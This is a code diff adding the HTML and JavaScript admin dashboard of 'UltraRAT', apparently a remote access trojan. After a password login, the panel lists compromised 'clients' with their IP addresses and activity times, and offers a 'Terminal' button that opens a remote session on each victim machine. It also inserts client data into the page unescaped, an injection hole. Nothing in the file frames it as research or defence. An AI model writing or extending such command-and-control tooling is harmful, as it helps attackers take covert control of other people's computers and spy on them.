@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UltraRAT Dashboard</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #1a1a2e;
+      color: #eee;
+      min-height: 100vh;
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .login-box {
+      background: #16213e;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .login-box h1 {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #00d9ff;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      border: none;
+      border-radius: 5px;
+      background: #1a1a2e;
+      color: #eee;
+      font-size: 16px;
+    }
+
+    .login-box input:focus {
+      outline: 2px solid #00d9ff;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 15px;
+      background: #00d9ff;
+      color: #1a1a2e;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .login-box button:hover {
+      background: #00b8d4;
+    }
+
+    .error-msg {
+      background: #e74c3c;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      text-align: center;
+      display: none;
+    }
+
+    /* Dashboard Styles */
+    .dashboard {
+      display: none;
+      padding: 20px;
+    }
+
+    .dashboard.active {
+      display: block;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #333;
+      margin-bottom: 30px;
+    }
+
+    header h1 {
+      color: #00d9ff;
+    }
+
+    .logout-btn {
+      background: #e74c3c;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+
+    .stat-card {
+      background: #16213e;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .stat-card h3 {
+      color: #888;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    .stat-card .value {
+      font-size: 36px;
+      color: #00d9ff;
+      font-weight: bold;
+    }
+
+    .clients-section {
+      background: #16213e;
+      border-radius: 10px;
+      padding: 20px;
+    }
+
+    .clients-section h2 {
+      margin-bottom: 20px;
+      color: #00d9ff;
+    }
+
+    .clients-table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    .clients-table th,
+    .clients-table td {
+      padding: 15px;
+      text-align: left;
+      border-bottom: 1px solid #333;
+    }
+
+    .clients-table th {
+      background: #1a1a2e;
+      color: #00d9ff;
+    }
+
+    .clients-table tr:hover {
+      background: #1a1a2e;
+    }
+
+    .status {
+      display: inline-block;
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .status.online {
+      background: #27ae60;
+      color: white;
+    }
+
+    .status.offline {
+      background: #e74c3c;
+      color: white;
+    }
+
+    .action-btn {
+      background: #00d9ff;
+      color: #1a1a2e;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 12px;
+      margin-right: 5px;
+      transition: background 0.3s;
+    }
+
+    .action-btn:hover {
+      background: #00b8d4;
+    }
+
+    .action-btn.terminal {
+      background: #27ae60;
+      color: white;
+    }
+
+    .action-btn.terminal:hover {
+      background: #2ecc71;
+    }
+
+    .refresh-btn {
+      background: #3498db;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .last-update {
+      color: #888;
+      font-size: 14px;
+      margin-left: 10px;
+    }
+
+    .no-clients {
+      text-align: center;
+      padding: 40px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <!-- Login Screen -->
+  <div class="login-container" id="loginContainer">
+    <div class="login-box">
+      <h1>UltraRAT Admin</h1>
+      <div class="error-msg" id="loginError">Invalid password</div>
+      <input type="password" id="passwordInput" placeholder="Enter admin password" autofocus>
+      <button onclick="login()">Login</button>
+    </div>
+  </div>
+
+  <!-- Dashboard -->
+  <div class="dashboard" id="dashboard">
+    <header>
+      <h1>UltraRAT Dashboard</h1>
+      <button class="logout-btn" onclick="logout()">Logout</button>
+    </header>
+
+    <div class="stats">
+      <div class="stat-card">
+        <h3>Total Clients</h3>
+        <div class="value" id="totalClients">0</div>
+      </div>
+      <div class="stat-card">
+        <h3>Online</h3>
+        <div class="value" id="onlineClients">0</div>
+      </div>
+      <div class="stat-card">
+        <h3>Offline</h3>
+        <div class="value" id="offlineClients">0</div>
+      </div>
+    </div>
+
+    <div class="clients-section">
+      <div style="display: flex; justify-content: space-between; align-items: center;">
+        <h2>Connected Clients</h2>
+        <div>
+          <button class="refresh-btn" onclick="loadClients()">Refresh</button>
+          <span class="last-update" id="lastUpdate">Last: --</span>
+        </div>
+      </div>
+
+      <table class="clients-table">
+        <thead>
+          <tr>
+            <th>Client ID</th>
+            <th>Status</th>
+            <th>Connected At</th>
+            <th>Last Activity</th>
+            <th>IP Address</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody id="clientsTableBody">
+          <tr class="no-clients">
+            <td colspan="6">No clients connected</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <script>
+    let refreshInterval;
+
+    // Check auth status on load
+    checkAuth();
+
+    async function checkAuth() {
+      try {
+        const res = await fetch('/api/auth');
+        const data = await res.json();
+        if (data.authenticated) {
+          showDashboard();
+        }
+      } catch (e) {
+        console.error('Auth check failed:', e);
+      }
+    }
+
+    async function login() {
+      const password = document.getElementById('passwordInput').value;
+      const errorEl = document.getElementById('loginError');
+
+      try {
+        const res = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ password })
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+          showDashboard();
+        } else {
+          errorEl.style.display = 'block';
+        }
+      } catch (e) {
+        errorEl.textContent = 'Connection failed';
+        errorEl.style.display = 'block';
+      }
+    }
+
+    function showDashboard() {
+      document.getElementById('loginContainer').style.display = 'none';
+      document.getElementById('dashboard').classList.add('active');
+      loadClients();
+      refreshInterval = setInterval(loadClients, 5000); // Auto-refresh every 5s
+    }
+
+    async function logout() {
+      try {
+        await fetch('/api/logout', { method: 'POST' });
+        location.reload();
+      } catch (e) {
+        console.error('Logout failed:', e);
+      }
+    }
+
+    async function loadClients() {
+      try {
+        const res = await fetch('/api/clients');
+        const data = await res.json();
+
+        updateStats(data.clients);
+        updateTable(data.clients);
+        updateLastUpdate();
+      } catch (e) {
+        console.error('Failed to load clients:', e);
+      }
+    }
+
+    function updateStats(clients) {
+      const total = clients.length;
+      const online = clients.filter(c => c.status === 'online').length;
+      const offline = total - online;
+
+      document.getElementById('totalClients').textContent = total;
+      document.getElementById('onlineClients').textContent = online;
+      document.getElementById('offlineClients').textContent = offline;
+    }
+
+    function updateTable(clients) {
+      const tbody = document.getElementById('clientsTableBody');
+
+      if (clients.length === 0) {
+        tbody.innerHTML = '<tr class="no-clients"><td colspan="6">No clients connected</td></tr>';
+        return;
+      }
+
+      tbody.innerHTML = clients.map(client => `
+        <tr>
+          <td><code>${client.id}</code></td>
+          <td><span class="status ${client.status}">${client.status}</span></td>
+          <td>${formatDate(client.connectedAt)}</td>
+          <td>${formatDate(client.lastActivity)}</td>
+          <td><code>${client.ip || 'N/A'}</code></td>
+          <td>
+            <button class="action-btn terminal" onclick="openTerminal('${client.id}')">Terminal</button>
+          </td>
+        </tr>
+      `).join('');
+    }
+
+    function formatDate(dateStr) {
+      if (!dateStr) return 'N/A';
+      const date = new Date(dateStr);
+      return date.toLocaleString();
+    }
+
+    function updateLastUpdate() {
+      const now = new Date();
+      document.getElementById('lastUpdate').textContent = 'Last: ' + now.toLocaleTimeString();
+    }
+
+    function openTerminal(clientId) {
+      window.open('/terminal/' + clientId, '_blank');
+    }
+
+    // Enter key to login
+    document.getElementById('passwordInput').addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') login();
+    });
+  </script>
+</body>
+</html>
